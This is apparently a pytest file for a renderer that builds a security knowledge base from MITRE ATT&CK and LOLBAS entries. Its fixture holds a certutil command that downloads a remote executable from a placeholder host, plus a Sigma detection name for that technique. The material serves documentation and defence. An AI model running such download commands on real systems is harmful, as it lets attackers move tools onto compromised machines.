from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

from src.kb_builder.render.ghvault import GhVaultRenderer


class DummyLogger:
    def info(self, message: str) -> None:
        pass

    def warning(self, message: str) -> None:
        pass

    def error(self, message: str) -> None:
        pass

    def debug(self, message: str) -> None:
        pass


def test_ghvault_renderer_preserves_detection_and_creates_command_page(tmp_path: Path) -> None:
    technique = SimpleNamespace(
        id="T1105",
        source="mitre",
        type="technique",
        name="Ingress Tool Transfer",
        description="Adversaries may transfer tools or other files into a compromised environment.",
        raw={"name": "Ingress Tool Transfer"},
        aliases=[],
    )
    command = SimpleNamespace(
        command="certutil.exe -urlcache -split -f https://example.invalid/file.exe file.exe",
        description="Download a remote file.",
        usecase="Download remote file",
        category="Download",
        privileges="User",
        mitre_id="T1105",
        operating_system="Windows",
    )
    tool = SimpleNamespace(
        id="certutil.exe",
        source="lolbas",
        type="tool",
        name="certutil.exe",
        description="Certificate utility.",
        aliases=["certutil", "certutil.exe"],
        commands=[command],
        detections=["Sigma: suspicious certutil download"],
        raw={
            "Name": "certutil.exe",
            "Detection": [{"Sigma": "suspicious certutil download"}],
            "_source_path": str(tmp_path / "Certutil.yml"),
        },
    )
    (tmp_path / "Certutil.yml").write_text("Name: certutil.exe\n", encoding="utf-8")

    renderer = GhVaultRenderer(
        config={"rendering": {"parsed_marker": "focuslocust"}, "ghvault": {"manual_path": str(tmp_path / "manual")}},
        root=tmp_path / "ghvault",
        logger=DummyLogger(),
        strict=True,
    )
    result = renderer.render(
        objects_by_group={"mitre/techniques": [technique], "lolbas/tools": [tool]},
        raw_sources={"lolbas": [tool.raw]},
    )

    assert result.broken_links == []
    command_page = tmp_path / "ghvault" / "kb" / "commands" / "windows" / "certutil.md"
    source_page = tmp_path / "ghvault" / "kb" / "sources" / "lolbas" / "certutil.exe.md"
    tool_page = tmp_path / "ghvault" / "kb" / "tools" / "windows" / "certutil.exe.md"

    assert command_page.exists()
    assert source_page.exists()
    assert tool_page.exists()
    tool_text = tool_page.read_text(encoding="utf-8")
    assert "Use only in authorised environments" in command_page.read_text(encoding="utf-8")
    assert "suspicious certutil download" in source_page.read_text(encoding="utf-8")
    assert "T1105 - Ingress Tool Transfer" in tool_text
    assert "[source record](../../sources/lolbas/certutil.exe.md)" in tool_text
    assert "## Evidence Excerpt" in tool_text
